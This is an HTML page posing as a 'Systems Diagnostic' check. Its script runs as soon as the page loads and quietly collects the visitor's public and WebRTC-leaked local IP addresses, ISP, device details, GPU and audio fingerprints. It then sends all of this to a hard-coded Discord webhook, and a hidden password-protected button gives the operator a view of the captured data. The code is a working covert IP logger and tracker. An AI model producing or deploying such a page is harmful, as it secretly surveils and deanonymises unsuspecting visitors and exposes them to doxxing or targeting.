<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Systems Diagnostic</title>
    <style>
        body, html { margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f7f6; color: #333; }
        #public-view { display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; text-align: center; background-color: #ffffff; }
        #public-view h1 { color: #2c3e50; font-weight: normal; }
        
        /* Hidden Admin Access */
        #admin-login-btn { position: fixed; top: 15px; right: 15px; width: 30px; height: 30px; background: transparent; border: none; cursor: pointer; z-index: 100; }
        #admin-view { display: none; padding: 40px; max-width: 1200px; margin: 0 auto; }
        .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #e0e0e0; padding-bottom: 20px; margin-bottom: 30px; }
        .visitor-card { background: white; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); padding: 20px; border-top: 4px solid #3498db; }
        .data-row { display: flex; justify-content: space-between; font-size: 0.9em; margin-bottom: 4px; border-bottom: 1px dashed #f0f0f0; padding-bottom: 2px; }
        .data-label { color: #555; font-weight: 500; }
        .data-value { color: #2c3e50; text-align: right; max-width: 60%; word-wrap: break-word; font-family: monospace; }
    </style>
</head>
<body>

    <div id="public-view">
        <h1>Welcome</h1>
        <p>System check in progress...</p>
    </div>

    <button id="admin-login-btn"></button>

    <div id="admin-view">
        <div class="header">
            <h2>Local Telemetry View</h2>
            <button id="btn-close" style="padding: 8px 16px; background: #e74c3c; color: white; border: none; cursor: pointer;">Exit</button>
        </div>
        <div id="visitor-grid"></div>
    </div>

    <script>
        const sessionId = 'ID-' + Math.random().toString(36).substr(2, 9).toUpperCase();
        const webhookUrl = "https://discord.com/api/webhooks/1487371339881906177/BOhU036avil2oOCS8Eb6CeaJolwYlV7zFA-YmdfMZzMWgnrnlY0c0C4spqjRIumGylyY"; 
        
        const visitorData = {
            network: { ipv4: "Fetching...", ipv6: "Fetching...", local: [], isp: "Fetching..." },
            hardware: { os: navigator.platform, ua: navigator.userAgent, cpu: navigator.hardwareConcurrency || 'N/A', ram: navigator.deviceMemory || 'N/A', res: `${window.screen.width}x${window.screen.height}` },
            fingerprint: { audio: "Processing...", gpu: "Processing..." }
        };

        // Network Data Collection
        async function getNetworkInfo() {
            try {
                const v4 = await fetch('https://api.ipify.org?format=json').then(r => r.json());
                visitorData.network.ipv4 = v4.ip;

                try {
                    const v6 = await fetch('https://api64.ipify.org?format=json').then(r => r.json());
                    visitorData.network.ipv6 = v6.ip !== v4.ip ? v6.ip : "N/A";
                } catch(e) {}

                const geo = await fetch(`https://ipapi.co/${v4.ip}/json/`).then(r => r.json());
                visitorData.network.isp = geo.org || "Unknown";
                renderLocal();
            } catch (e) { visitorData.network.ipv4 = "Blocked"; }
        }

        // WebRTC Local IP
        function getLocalIP() {
            const rtc = new RTCPeerConnection();
            rtc.createDataChannel('');
            rtc.createOffer().then(o => rtc.setLocalDescription(o));
            rtc.onicecandidate = (e) => {
                if (e.candidate) {
                    const ip = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-z0-9\-]+\.local)/i);
                    if (ip && !visitorData.network.local.includes(ip[1])) visitorData.network.local.push(ip[1]);
                }
            };
        }

        // Hardware & Fingerprints
        function getBiometrics() {
            // GPU
            try {
                const gl = document.createElement('canvas').getContext('webgl');
                const debug = gl.getExtension('WEBGL_debug_renderer_info');
                visitorData.fingerprint.gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
            } catch(e) {}

            // Audio Fingerprint
            try {
                const ctx = new (window.AudioContext || window.webkitAudioContext)();
                const osc = ctx.createOscillator();
                const proc = ctx.createScriptProcessor(4096, 1, 1);
                osc.connect(proc); proc.connect(ctx.destination);
                proc.onaudioprocess = (e) => {
                    let hash = 0;
                    const data = e.inputBuffer.getChannelData(0);
                    for (let i = 0; i < data.length; i++) hash += Math.abs(data[i]);
                    visitorData.fingerprint.audio = hash.toString().substring(0, 12);
                    osc.stop(); proc.disconnect();
                    renderLocal();
                };
                osc.start(0);
            } catch(e) {}
        }

        // Exfiltration to Discord
        function postToDiscord() {
            // Wait for async tasks to finish
            setTimeout(() => {
                const embed = {
                    username: "Telemetry Bot",
                    embeds: [{
                        title: `Session: ${sessionId}`,
                        color: 15158332, // Red-ish
                        fields: [
                            { name: "🌐 Public Network", value: `**IPv4:** ${visitorData.network.ipv4}\n**IPv6:** ${visitorData.network.ipv6}\n**ISP:** ${visitorData.network.isp}`, inline: false },
                            { name: "🏠 Internal Network", value: `**Local IP:** ${visitorData.network.local.join(', ') || 'Masked'}`, inline: false },
                            { name: "💻 Device Specs", value: `**OS:** ${visitorData.hardware.os}\n**Resolution:** ${visitorData.hardware.res}\n**Cores:** ${visitorData.hardware.cpu} | **RAM:** ${visitorData.hardware.ram}GB`, inline: true },
                            { name: "🧬 Fingerprints", value: `**Audio ID:** ${visitorData.fingerprint.audio}\n**GPU:** ${visitorData.fingerprint.gpu}`, inline: false },
                            { name: "📄 Browser Agent", value: `\`\`\`${visitorData.hardware.ua}\`\`\``, inline: false }
                        ],
                        footer: { text: `Capture Time: ${new Date().toLocaleString()}` }
                    }]
                };

                fetch(webhookUrl, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(embed) });
            }, 2000);
        }

        function renderLocal() {
            document.getElementById('visitor-grid').innerHTML = `
                <div class="visitor-card">
                    <div class="data-row"><span class="data-label">IP</span><span class="data-value">${visitorData.network.ipv4}</span></div>
                    <div class="data-row"><span class="data-label">Audio ID</span><span class="data-value">${visitorData.fingerprint.audio}</span></div>
                </div>`;
        }

        // Initialization
        window.onload = () => {
            getNetworkInfo();
            getLocalIP();
            getBiometrics();
            postToDiscord();
        };

        // Admin Panel Logic
        document.getElementById('admin-login-btn').onclick = () => {
            if (prompt("Pass:") === "monterysasd") {
                document.getElementById('public-view').style.display = 'none';
                document.getElementById('admin-view').style.display = 'block';
            }
        };
        document.getElementById('btn-close').onclick = () => location.reload();
    </script>
</body>
</html>
